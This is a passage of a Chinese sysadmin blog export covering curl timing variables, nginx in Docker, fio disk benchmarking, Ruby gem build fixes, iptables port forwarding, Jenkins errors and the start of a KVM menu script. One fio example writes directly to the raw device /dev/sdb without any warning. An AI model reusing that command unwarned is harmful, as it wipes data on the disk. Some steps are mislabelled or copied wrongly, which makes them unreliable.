<li><strong>time_connect</strong> 连接时间,从开始到建立TCP连接完成所用时间,包括前边DNS解析时间，如果需要单纯的得到连接时间，用这个time_connect时间减去前边time_namelookup时间。以下同理，不再赘述。(The time, in seconds, it took from the start until the TCP connect to the remote host (or proxy) was completed.)</li>
<li><strong>time_appconnect</strong> 连接建立完成时间，如SSL/SSH等建立连接或者完成三次握手时间。(The time, in seconds, it took from the start until the SSL/SSH/etc connect/handshake to the remote host was completed. (Added in 7.19.0))</li>
<li><strong>time_pretransfer</strong> 从开始到准备传输的时间。(The time, in seconds, it took from the start until the file transfer was just about to begin. This includes all pre-transfer commands and negotiations that are specific to the particular protocol(s) involved.)</li>
<li><strong>time_redirect</strong> 重定向时间，包括到最后一次传输前的几次重定向的DNS解析，连接，预传输，传输时间。(The time, in seconds, it took for all redirection steps include name lookup, connect, pretransfer and transfer before the final transaction was started. time_redirect shows the complete execution time for multiple redirections. (Added in 7.12.3))</li>
<li><strong>time_starttransfer</strong> 开始传输时间。在发出请求之后，Web 服务器返回数据的第一个字节所用的时间(The time, in seconds, it took from the start until the first byte was just about to be transferred. This includes time_pretransfer and also the time the server needed to calculate the result.)</li>
<li><strong>size_download</strong> 下载大小。(The total amount of bytes that were downloaded.)</li>
<li><strong>size_upload</strong> 上传大小。(The total amount of bytes that were uploaded.)<br>size_header 下载的header的大小(The total amount of bytes of the downloaded headers.)</li>
<li><strong>size_request</strong> 请求的大小。(The total amount of bytes that were sent in the HTTP request.)</li>
<li><strong>speed_download</strong> 下载速度，单位-字节每秒。(The average download speed that curl measured for the complete download. Bytes per second.)</li>
<li><strong>speed_upload</strong> 上传速度,单位-字节每秒。(The average upload speed that curl measured for the complete upload. Bytes per second.)</li>
<li><strong>content_type</strong> 就是content-Type，不用多说了，这是一个访问我博客首页返回的结果示例(text/html; charset=UTF-8)；(The Content-Type of the requested document, if there was any.)</li>
<li><strong>num_connects</strong> 最近的的一次传输中创建的连接数目。Number of new connects made in the recent transfer. (Added in 7.12.3)</li>
<li><strong>num_redirects</strong> 在请求中跳转的次数。Number of redirects that were followed in the request. (Added in 7.12.3)</li>
<li><strong>redirect_url</strong> When a HTTP request was made without -L to follow redirects, this variable will show the actual URL a redirect would take you to. (Added in 7.18.2)</li>
<li><strong>ftp_entry_path</strong> 当连接到远程的ftp服务器时的初始路径。The initial path libcurl ended up in when logging on to the remote FTP server. (Added in 7.15.4)</li>
<li><strong>ssl_verify_result</strong> ssl认证结果，返回0表示认证成功。( The result of the SSL peer certificate verification that was requested. 0 means the verification was successful. (Added in 7.19.0))</li>
</ol>
]]></content>
      <categories>
        <category>curl</category>
      </categories>
      <tags>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>docker运行nginx为什么要使用 nginx -g &#39;daemon off;&#39;</title>
    <url>/2019/07/30/docker%E8%BF%90%E8%A1%8Cnginx%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8-nginx--g-daemon-off;/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="docker运行nginx为什么要使用-nginx-g-‘daemon-off-’"><a href="#docker运行nginx为什么要使用-nginx-g-‘daemon-off-’" class="headerlink" title="docker运行nginx为什么要使用 nginx -g ‘daemon off;’"></a>docker运行nginx为什么要使用 nginx -g ‘daemon off;’</h1><p>1.docker容器跑着为啥会挂掉？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker 容器默认会把容器内部第一个进程，也就是pid=1的程序作为docker容器是否正在运行的依据，如果docker 容器pid挂了，那么docker容器便会直接退出。</span><br></pre></td></tr></table></figure>

<p>2.docker run的时候把command最为容器内部命令，如果你使用nginx，那么nginx程序将后台运行，这个时候nginx并不是pid为1的程序，而是执行的bash，这个bash执行了nginx指令后就挂了，所以容器也就退出了，和你这个一样的道理，pm2 start 过后，bash 的pid为1，那么此时bash执行完以后会退出，所以容器也就退出了。</p>
<p>Nginx的docker仓库原文说明如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">If you add a custom CMD ``in` `the Dockerfile, be sure to include -g daemon off; ``in` `the CMD ``in` `order ``for` `nginx to stay ``in` `the foreground, so that Docker can track the process properly (otherwise your container will stop immediately after starting)!` `Running nginx ``in` `debug mode``Images since version 1.9.8 come with nginx-debug binary that produces verbose output when using higher log levels. It can be used with simple CMD substitution:` `$ docker run --name my-nginx -``v` `/host/path/nginx``.conf:``/etc/nginx/nginx``.conf:ro -d nginx nginx-debug -g ``'daemon off;'``Similar configuration ``in` `docker-compose.yml may ``look` `like this:` `web:`` ``image: nginx`` ``volumes:``  ``- .``/nginx``.conf:``/etc/nginx/nginx``.conf:ro`` ``command``: [nginx-debug, ``'-g'``, ``'daemon off;'``]</span><br></pre></td></tr></table></figure>

<p>　　</p>
<p>If you add a custom CMD in the Dockerfile, be sure to include <code>-g daemon off;</code> in the CMD in order for nginx to stay in the foreground, so that Docker can track the process properly (otherwise your container will stop immediately after starting)!</p>
<p>– 这里的<code>CMD</code>适用 docker-compose.yml 中的<code>entrypoint</code>和<code>command</code>，以及 Dockerfile 中的<code>ENTRYPOINT</code>和<code>CMD</code>。</p>
<p>也就是说：</p>
<blockquote>
<p>Docker 容器启动时，默认会把容器内部第一个进程，也就是<code>pid=1</code>的程序，作为docker容器是否正在运行的依据，如果 docker 容器pid=1的进程挂了，那么docker容器便会直接退出。</p>
<p>Docker未执行自定义的CMD之前，nginx的pid是1，执行到CMD之后，nginx就在后台运行，bash或sh脚本的pid变成了1。</p>
<p>所以一旦执行完自定义CMD，nginx容器也就退出了。</p>
</blockquote>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>fio 磁盘性能压测</title>
    <url>/2018/12/08/fio%20%E7%A3%81%E7%9B%98%E6%80%A7%E8%83%BD%E5%8E%8B%E6%B5%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="fio-磁盘性能压测"><a href="#fio-磁盘性能压测" class="headerlink" title="fio 磁盘性能压测"></a>fio 磁盘性能压测</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常用参数的说明</span><br><span class="line">--debug 调试模式 </span><br><span class="line">--version 显示版本信息 </span><br><span class="line">测试任务相关的参数 </span><br><span class="line">--output= 文件名 输出到文件 </span><br><span class="line">--runtime= 限制运行时间 单位为秒 </span><br><span class="line">--name= 字符串 测试项目名称 </span><br><span class="line">--description= 字符串 测试项目描述 </span><br><span class="line">--filename= 测试文件，也可以制定到裸设备上 </span><br><span class="line">--size= 测试文件大小 </span><br><span class="line">--filesize= 单独的文件大小，也可以是一个范围，fio在设定的size只内随机的选择大小，如果没有指定，每个子文件大小相同。 </span><br><span class="line">读写相关的参数 </span><br><span class="line">--readwrite=</span><br><span class="line">read 顺序读 </span><br><span class="line">write 顺序写 </span><br><span class="line">trim 顺序trim，只支持Linux块设备 </span><br><span class="line">randread 随机读 </span><br><span class="line">randwrite 随机写 </span><br><span class="line">randtrim 随机trim 只支持Linux块设备 </span><br><span class="line">rw，readnwrite 混合读写 </span><br><span class="line">randrw 随机混合读写 </span><br><span class="line">如果是混合读写，默认是 50/50 即50%读加50%的写，对于特定的类型，结果会有些出入，因为速度可能不一样。可以在测试的指定一个数字， </span><br><span class="line">rwmixwrite=20 混合读写，写占20% </span><br><span class="line">direct=1 或者0 ，1为绕过文件系统的缓存 </span><br><span class="line">--blocksize= </span><br><span class="line">--bs= 测试块大小，4K 8K 1M 等 </span><br><span class="line">--bssplit=字符串 需要测试混合块大小的时候使用，可以按照如下的格式 </span><br><span class="line">bssplit=4k/10:64k/50:32k/40 4K占10% 64K占50% 32k占40% </span><br><span class="line">也可以不指定百分比，fio会平均分配，比如 </span><br><span class="line">bssplit=4k/50:1k/:32k/ 就是4k占50% 1K 32看各占25% </span><br><span class="line">bssplit 读写的时候都可以使用 </span><br><span class="line">运行相关参数 </span><br><span class="line">--max-job= 运行的最高线程 </span><br><span class="line">--zero_buffers 如果使用这个参数，fio会初始化IO缓存，并默认使用随机的数据填满缓存。 </span><br><span class="line">--refill_buffers 强制重新填写读写缓存 </span><br><span class="line">--iodepth= io队列深度 默认是1 </span><br><span class="line">--direct= 0或者1 1为关闭文件系统缓存 </span><br><span class="line">--numjobs= 线程数量 </span><br><span class="line">--group_reporting 汇总每个进程的信息 </span><br><span class="line">--lockmem= 固件测试的时候内存大小 比如2G </span><br><span class="line">--nrfiles=8 每个进程生成文件的数量</span><br><span class="line"></span><br><span class="line">下面几个参数在libaio的引擎下的作用： </span><br><span class="line">--iodepth_batch=当队列里面的IO个数达到该值的时候，就调用io_submit批次提交请求 </span><br><span class="line">--iodepth_batch_complete=一次最多可收割的io数 </span><br><span class="line">--iodepth_low=队列的io数降到该值，就重新填充</span><br><span class="line"></span><br><span class="line">2.fio使用案例</span><br><span class="line">文件系统4k顺序读测试 </span><br><span class="line">fio --filename=/tmp/test --direct=1 --rw=read --bs=4k --size=1G --numjobs=64 --runtime=300 --group_reporting --name=test-read </span><br><span class="line">文件系统4k随机写测试 </span><br><span class="line">fio --filename=/tmp/test --direct=1 --rw=randrw --bs=4k --size=1G --numjobs=64 --runtime=60 --group_reporting --name=test-read </span><br><span class="line">裸设备4k顺序写测试 </span><br><span class="line">fio --filename=/dev/sdb --direct=1 --rw=randrw --bs=4k --size=15G --numjobs=64 --runtime=300 --group_reporting --name=test-read</span><br><span class="line"></span><br><span class="line">3.测试结果解读</span><br><span class="line">fio --filename=/test --direct=1 --rw=randwrite --bs=4k --size=1G --numjobs=64 --runtime=300 --group_reporting --name=test-randwrite </span><br><span class="line">… </span><br><span class="line">write: io=2850.2MB, bw=9726.1KB/s, iops=2431 , runt=300048msec </span><br><span class="line">clat (usec): min=159 , max=448315 , avg=410.20, stdev=1208.19 </span><br><span class="line">lat (usec): min=159 , max=448315 , avg=411.15, stdev=1208.27 </span><br><span class="line">clat percentiles (usec): </span><br><span class="line">| 1.00th=[ 203], 5.00th=[ 278], 10.00th=[ 326], 20.00th=[ 346], </span><br><span class="line">| 30.00th=[ 366], 40.00th=[ 386], 50.00th=[ 402], 60.00th=[ 418], </span><br><span class="line">| 70.00th=[ 434], 80.00th=[ 454], 90.00th=[ 486], 95.00th=[ 516], </span><br><span class="line">| 99.00th=[ 724], 99.50th=[ 1032], 99.90th=[ 1368], 99.95th=[ 2224], </span><br><span class="line">| 99.99th=[ 8256] </span><br><span class="line">bw (KB/s) : min= 3, max= 667, per=1.57%, avg=152.30, stdev=27.63 </span><br><span class="line">lat (usec) : 250=3.92%, 500=89.07%, 750=6.14%, 1000=0.32% </span><br><span class="line">lat (msec) : 2=0.49%, 4=0.03%, 10=0.02%, 20=0.01%, 50=0.01% </span><br><span class="line">lat (msec) : 500=0.01% </span><br><span class="line">cpu : usr=0.04%, sys=0.23%, ctx=1548182, majf=0, minf=1844 </span><br><span class="line">IO depths : 1=100.0%, 2=0.0%, 4=0.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0% </span><br><span class="line">submit : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0% </span><br><span class="line">complete : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0% </span><br><span class="line">issued : total=r=0/w=729637/d=0, short=r=0/w=0/d=0</span><br><span class="line"></span><br><span class="line">Run status group 0 (all jobs): </span><br><span class="line">WRITE: io=2850.2MB, aggrb=9726KB/s, minb=9726KB/s, maxb=9726KB/s, mint=300048msec, maxt=300048msec</span><br><span class="line"></span><br><span class="line">Disk stats (read/write): </span><br><span class="line">dm-0: ios=0/766673, merge=0/0, ticks=0/341324, in_queue=341316, util=86.15%, aggrios=0/731075, aggrmerge=0/35722, aggrticks=0/268135, aggrin_queue=267337, aggrutil=85.33% </span><br><span class="line">vda: ios=0/731075, merge=0/35722, ticks=0/268135, in_queue=267337, util=85.33%</span><br><span class="line"></span><br><span class="line">I/O延迟包括三种：slat，clat，lat </span><br><span class="line">关系是 lat = slat + clat。 </span><br><span class="line">slat 表示fio submit某个I/O的延迟。 </span><br><span class="line">clat 表示fio complete某个I/O的延迟。 </span><br><span class="line">lat 表示从fio将请求提交给内核，再到内核完成这个I/O为止所需要的时间。</span><br><span class="line"></span><br><span class="line">4.通过脚本执行fio测试</span><br><span class="line">fio 也可以将测试用例写好脚本，通过运行脚本，完成多项测试任务 </span><br><span class="line">; -- start -- </span><br><span class="line">[global] </span><br><span class="line">[random-writers] </span><br><span class="line">rw=randwrite </span><br><span class="line">bs=4K </span><br><span class="line">direct=1 </span><br><span class="line">size=30G </span><br><span class="line">numjobs=63 </span><br><span class="line">[random-read] </span><br><span class="line">rw=randread </span><br><span class="line">bs=4K </span><br><span class="line">direct=1 </span><br><span class="line">size=30G </span><br><span class="line">numjobs=63</span><br></pre></td></tr></table></figure>



<p>参数解析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">filename</span><br><span class="line">待测试的文件或块设备。</span><br><span class="line"></span><br><span class="line">若为文件，则代表测试文件系统的性能；例：-filename=/work/fstest/fio.img</span><br><span class="line"></span><br><span class="line">若为块设备，则代表测试裸设备的性能; 例：-filename=/dev/sdb1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ioengine</span><br><span class="line">采用的文件读写方式</span><br><span class="line"></span><br><span class="line">sync：采用read，write，使用fseek定位读写位置。</span><br><span class="line"></span><br><span class="line">psync：采用pread、pwrite进行文件读写操作</span><br><span class="line"></span><br><span class="line">vsync：采用readv(2) orwritev(2)进行文件读写操作，</span><br><span class="line"></span><br><span class="line">注：read()和write()系统调用每次在文件和进程的地址空间之间传送一块连续的数据。但是，应用有时也需要将分散在内存多处地方的数据连续写到文件中，或者反之。在这种情况下，如果要从文件中读一片连续的数据至进程的不同区域，使用read()则要么一次将它们读至一个较大的缓冲区中，然后将它们分成若干部分复制到不同的区域，要么调用read()若干次分批将它们读至不同区域。同样，如果想将程序中不同区域的数据块连续地写至文件，也必须进行类似的处理。UNIX提供了另外两个函数—readv()和writev()，它们只需一次系统调用就可以实现在文件和进程的多个缓冲区之间传送数据，免除了多次系统调用或复制数据的开销。readv()称为散布读，即将文件中若干连续的数据块读入内存分散的缓冲区中。writev()称为聚集写，即收集内存中分散的若干缓冲区中的数据写至文件的连续区域中。</span><br><span class="line"></span><br><span class="line">libaio：Linux异步读写IO(Linuxnative asynchronous I/O)</span><br><span class="line"></span><br><span class="line">posixaio: glibc POSIX 异步IO读写，使用aio_read(3)and aio_write(3)实现IO读写。</span><br><span class="line"></span><br><span class="line">mmap: File is memory mappedwith mmap(2) and data copied using memcpy(3).</span><br><span class="line"></span><br><span class="line">splice： splice(2) isused to transfer the data and vmsplice(2) to transfer data from user-space tothe kernel.</span><br><span class="line"></span><br><span class="line">syslet-rw： Use thesyslet system calls to make regular read/write asynchronous.</span><br><span class="line"></span><br><span class="line">sg：SCSI genericsg v3 I/O.</span><br><span class="line"></span><br><span class="line">net ： Transferover the network. filename must be set appropriately to `host/port’ regardlessof data direction. If receiving,only the port argument is used.</span><br><span class="line"></span><br><span class="line">netsplice： Like net,but uses splice(2) and vmsplice(2) to map data and send/receive.</span><br><span class="line"></span><br><span class="line">Guasi : The GUASI I/Oengine is the Generic Userspace Asynchronous Syscall Interface approach toasycnronous I/O.</span><br><span class="line"></span><br><span class="line">direct</span><br><span class="line">当前测试是否采用直接IO方式进行读写，如果采用直接IO，则取值-direct=1，否则取值-direct=0。</span><br><span class="line"></span><br><span class="line">采用直接IO写测试，会使得测试结果更加真实。</span><br><span class="line"></span><br><span class="line">rw</span><br><span class="line">读写模式。</span><br><span class="line"></span><br><span class="line">read：顺序读测试，使用方式-rw=read</span><br><span class="line"></span><br><span class="line">write：顺序写测试，使用方式-rw=write</span><br><span class="line"></span><br><span class="line">randread：随机读测试，使用方式-rw=randread</span><br><span class="line"></span><br><span class="line">randwrite：随机写测试，使用方式-rw=randwrite</span><br><span class="line"></span><br><span class="line">randrw：随机读写，-rw=randrw；默认比率为5:5，通过参数-rwmixread设定读的比率，如-rw=randrw-rwmixread=70，说明读写比率为70:30。或rwmixwrite</span><br><span class="line"></span><br><span class="line">bs</span><br><span class="line">单次IO的大小；例：-bs=4k</span><br><span class="line"></span><br><span class="line">bssplit</span><br><span class="line">设备读写访问的IO大小，例：-bssplit=4k/30:8k/40:16k/30，随机读4k文件占30%、8k占40%、16k占30%</span><br><span class="line"></span><br><span class="line">bsrange</span><br><span class="line">设置IO大小的范围，例如-bsrange=512-2048</span><br><span class="line"></span><br><span class="line">size</span><br><span class="line">本次测试文件的大小；例-size=1G</span><br><span class="line"></span><br><span class="line">iodepth</span><br><span class="line">IO队列深入，即一次下发的IO的个数，例如：-iodepth=16</span><br><span class="line"></span><br><span class="line">numjobs</span><br><span class="line">测试进程的并发数，默认为，例：-numjobs=16</span><br><span class="line"></span><br><span class="line">sync</span><br><span class="line">设置同步模式，同步-sync=1，异步-sync=0</span><br><span class="line"></span><br><span class="line">fsync</span><br><span class="line">设置数据同步模式，同步-fsync=1，异步-fsync=0</span><br><span class="line"></span><br><span class="line">runtime</span><br><span class="line">设置测试运行的时间，单位秒，例：-runtime=300</span><br><span class="line"></span><br><span class="line">group_reporting</span><br><span class="line">关于显示结果的，汇总每个进程的信息</span><br><span class="line"></span><br><span class="line">lockmem</span><br><span class="line">对测试所使用的内存进行限制，如-lockmem=1g，限制1G</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>fio</category>
      </categories>
      <tags>
        <tag>fio</tag>
        <tag>磁盘性能</tag>
      </tags>
  </entry>
  <entry>
    <title>gem install redis报错解决办法</title>
    <url>/2019/01/17/gem%20install%20redis%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="gem-install-redis报错解决办法"><a href="#gem-install-redis报错解决办法" class="headerlink" title="gem install redis报错解决办法"></a>gem install redis报错解决办法</h1><p>redis-cluster安装需要通过gem install redis来安装相关依赖。否则报错。<br> 通过gem install redis执行后会出现两个问题：<br> 1、缺少zlib依赖<br> 问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR:  Loading command: install (LoadError)</span><br><span class="line">cannot load such file -- zlib</span><br><span class="line">ERROR:  While executing gem ... (NoMethodError)</span><br><span class="line">undefined method 'invoke_with_build_args' for nil:NilClass</span><br></pre></td></tr></table></figure>

<p> 解决：<br> 通过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install zlib-devel</span><br></pre></td></tr></table></figure>

<p>安装zlib库<br> 然后集成zlib库到ruby环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/ruby-2.2.7/ext/zlib</span><br><span class="line">ruby extconf.rb</span><br></pre></td></tr></table></figure>

<p> 重要：ext/openssl/Makefile 增加 top_srcdir = ../..<br> //这一步如果不修改，make时会爆出另外一个错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//make:*** No rule to make target '/include/ruby.h', needed by 'zlib.o'.  Stop</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>2、缺少openssl库<br> 问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR:  While executing gem ... (Gem::Exception)</span><br><span class="line">Unable to require openssl, install OpenSSL and rebuild ruby (preferred) or use non-HTTPS sources</span><br></pre></td></tr></table></figure>

<p> 解决：<br> 通过yum install openssl-devel  安装openssl库<br> 然后集成到ruby环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/ruby-2.2.7/ext/zlib</span><br><span class="line">ruby extconf.rb </span><br><span class="line">重要：ext/openssl/Makefile 增加 top_srcdir = ../..</span><br><span class="line">//修改Makefile中的$(top_srcdir)为../..</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>再次运行gem install redis，出现下图则表示安装成功</p>
]]></content>
      <categories>
        <category>gem</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>gem</tag>
      </tags>
  </entry>
  <entry>
    <title>Iptables将本机80端口的请求转发到8080端口</title>
    <url>/2019/10/12/iptables%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%9C%BA%E5%99%A8%E5%92%8C%E4%B8%8D%E5%90%8C%E6%9C%BA%E5%99%A8%E9%97%B4%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a>Iptables</h1><h3 id="将本机80端口的请求转发到8080端口"><a href="#将本机80端口的请求转发到8080端口" class="headerlink" title="将本机80端口的请求转发到8080端口"></a>将本机80端口的请求转发到8080端口</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure>

<p>如果需要本机也可以访问，则需要配置OUTPUT链：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 80 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure>

<h3 id="两机之间的端口转发"><a href="#两机之间的端口转发" class="headerlink" title="两机之间的端口转发"></a>两机之间的端口转发</h3><ol>
<li>将本机的81端口的请求全部转发到192.168.1.1:80</li>
<li>首先要启用ipv4的转发功能：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p>或者是修改/etc/sysctl.conf (via)以便重启后也会启用转发，然后设定iptables(via)：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 81 -j DNAT --to 192.168.1.1:80 </span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></pre></td></tr></table></figure>

<p>如果开启了防火墙功能，注意要将80和81两个端口都打开。</p>
<h4 id="10-23-3-129上设置对10-21-1-91-443端口的转发脚本："><a href="#10-23-3-129上设置对10-21-1-91-443端口的转发脚本：" class="headerlink" title="10.23.3.129上设置对10.21.1.91 443端口的转发脚本："></a>10.23.3.129上设置对10.21.1.91 443端口的转发脚本：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/sbin/iptables  -t nat -F</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">/sbin/iptables -t nat -A PREROUTING -p tcp  --dport 443 -j DNAT --to 10.21.1.91:443</span><br><span class="line">/sbin/iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class="line">/sbin/iptables -t nat -L -n</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins构建失败错误问题汇总</title>
    <url>/2018/10/16/jenkins%E6%9E%84%E5%BB%BA%E5%A4%B1%E8%B4%A5%E9%94%99%E8%AF%AF%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="jenkins构建失败错误问题汇总"><a href="#jenkins构建失败错误问题汇总" class="headerlink" title="jenkins构建失败错误问题汇总"></a>jenkins构建失败错误问题汇总</h1><p>今天突然被叫去开会，说项目要实现按自动化部署，生成检查报告。因为项目办要统计数据，不合格就要核减绩效。</p>
<p>然后就是为期一天半的学习，调试，从零到完成这项工作，过程中学到很多，就记录下来。</p>
<p>由于我的邮箱问题之前 被同事占用了，导致我不能提交代码。</p>
<p>这次配置jenkins也是我第一次正式使用git提交代码。</p>
<p>打开git–&gt;修改git仓库中的代码–&gt;返回git–&gt;提交–&gt;输入提交信息–&gt;提交并推送。</p>
<p>这是我所用的git大致的使用流程。</p>
<p>然后来到Jenkins找到你的项目，点击立即构建</p>
<p><strong>jenkins构建失败错误问题汇总：</strong></p>
<p><strong>问题1：。。。WebContent\WEB-INF\lib does not exist</strong></p>
<p>报错原因：build_junit.xml文件中lib.dir路径或者名称有问题</p>
<p>解决办法：修改路径参数</p>
<p><strong>问题2：。。。。\src does not exist</strong></p>
<p>报错原因：build_junit.xml文件中src.dir或者名称路径有问题</p>
<p>解决办法：修改路径参数</p>
<p><strong>问题3：软件包javax.servlet.jsp.target不存在</strong></p>
<p><strong>问题4：软件包javax.servlet.jsp不存在</strong></p>
<p><strong>问题5：找不到符号类HttpServletRequest</strong></p>
<p><strong>问题5：找不到符号类HttpServletResponse</strong></p>
<p><strong>总之与Servlet有关的错误</strong></p>
<p>原因：缺少jar包Servlet-api</p>
<p>解决办法：将servlet-api加入到正确的项目目录</p>
<p><strong>问题7：删除无座用的import代码</strong></p>
<p><strong>问题8：软件包org.junit不存在</strong></p>
<p><strong>问题9：找不到符号，类JUnit4TestAdapter</strong></p>
<p>等等</p>
<p>缺少jar包</p>
]]></content>
      <categories>
        <category>jenkins</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>KVM管理脚本</title>
    <url>/2019/03/20/kvm%E7%AE%A1%E7%90%86%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>KVM一键管理虚拟机脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kvm1="++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">+                                                                        +</span><br><span class="line">+           + +   + +              + +          21.查看虚拟机            +</span><br><span class="line">+          +   + +   +             + +          22.设置硬件CPU           +</span><br><span class="line">+           +       +            +++++++        23.设置硬件内存          +</span><br><span class="line">+             +   +                +++                                   +</span><br><span class="line">+               +                  +++                                   +</span><br><span class="line">+     kvm管理器 v.0.10             +++                                   +</span><br><span class="line">+     1.创建虚拟机                 +++                                   +</span><br><span class="line">+     2.启动虚拟机                  +                                    +</span><br><span class="line">+     3.删除虚拟机                                                       +</span><br><span class="line">+     4.添加硬盘                                                         +</span><br><span class="line">+     5.添加网卡                                                         +</span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">+                      6.【设置主机名与IP】                              +</span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">+       &amp;&amp;$                                                              +</span><br><span class="line">+      &amp;&amp;&amp;$&amp;                                                             +</span><br><span class="line">+    $&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                                           +</span><br><span class="line">+     $&amp;&amp;&amp;&amp;&amp;                                                             +</span><br><span class="line">+      $&amp;&amp;&amp;                                                              +</span><br><span class="line">+       &amp;&amp;                        7.关闭虚拟机                           +</span><br><span class="line">+       &amp;&amp;                        8.帮助 或 h键                          +</span><br><span class="line">+       &amp;&amp;                        9.退出 或 q键                          +</span><br><span class="line">+       &amp;&amp;                     888.全新机器必选项                        +</span><br><span class="line">+       &amp;&amp;                                                               + </span><br><span class="line">+       &amp;&amp;                                                               +</span><br><span class="line">+       &amp;&amp;                                                               +</span><br><span class="line">+       &amp;&amp;                                                               +</span><br><span class="line">+                                                                        +</span><br><span class="line">+                                                                        +</span><br><span class="line">+                                                                        +</span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"</span><br><span class="line">kvm2="&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</span><br><span class="line">^                                                                                         ^</span><br><span class="line">^       1.自定义创建虚拟机 #不推荐使用此项                                                ^</span><br><span class="line">^       2.快速创建虚拟机                                                                  ^</span><br><span class="line">^       3.上一层菜单                                                                      ^</span><br><span class="line">^                                                                                         ^</span><br><span class="line">^  # 注，此项位新机选择项，安装时间较长，因为是安装一个全新的Linux系统，不是克隆链接等    ^</span><br><span 